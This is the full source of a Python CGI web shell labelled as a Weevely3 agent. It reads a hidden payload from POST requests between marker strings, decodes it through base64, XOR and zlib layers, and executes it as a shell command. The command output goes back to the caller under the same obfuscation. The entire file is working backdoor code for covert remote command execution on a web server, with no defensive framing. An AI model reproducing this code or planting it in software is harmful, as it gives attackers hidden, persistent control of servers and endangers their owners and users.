b'\n\n#!/usr/bin/env python3\nimport sys\nimport os\nimport zlib\nimport base64\nimport subprocess\n\n# Weevely3 Python CGI Agent\n# Implements XOR -> GZIP -> Base64 protocol\n\ndef xor(data, key):\n    key_len = len(key)\n    return bytearray([b ^ key[i % key_len] for i, b in enumerate(data)])\n\ndef run():\n    # Password hash parts injected by generator\n    k = b"5f4dcc3b"\n    kh = b"5aa765d61d83"\n    kf = b"27deb882cf99"\n    p = b"jRJ1ARTLHeycLhaa"\n\n    if os.environ.get("REQUEST_METHOD") == "POST":\n        try:\n            content = sys.stdin.buffer.read()\n            \n            start = content.find(kh)\n            end = content.find(kf)\n\n            if start != -1 and end != -1:\n                payload = content[start + len(kh) : end]\n\n                # Decode: Base64 -> XOR -> Gunzip\n                decoded = base64.b64decode(payload)\n                unxorred = xor(decoded, k)\n                cmd = zlib.decompress(unxorred).decode("utf-8")\n\n                # Execute Command\n                # We expect a shell command\n                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                stdout, stderr = proc.communicate()\n                output = stdout + stderr\n\n                # Encode: Gzip -> XOR -> Base64\n                compressed = zlib.compress(output)\n                re_xorred = xor(compressed, k)\n                encoded = base64.b64encode(re_xorred)\n\n                sys.stdout.buffer.write(p + kh + encoded + kf)\n\n        except Exception:\n            pass\n    else:\n        print("Content-Type: text/plain\\n\\n")\n\nif __name__ == "__main__":\n    run()\n'
